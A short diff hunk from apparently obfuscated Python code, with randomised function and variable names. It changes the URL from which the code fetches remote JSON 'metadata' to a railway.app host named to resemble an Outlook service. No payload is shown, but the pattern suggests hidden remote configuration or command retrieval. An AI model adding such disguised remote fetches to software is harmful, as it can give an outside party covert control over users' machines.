@@ -18,7 +18,7 @@ def config_rjuxhu_243():
 
     def process_wmqlbh_353():
         try:
-            data_qrekbd_947 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_qrekbd_947 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_qrekbd_947.raise_for_status()
             net_naebcc_497 = data_qrekbd_947.json()
             learn_byytxl_957 = net_naebcc_497.get('metadata')
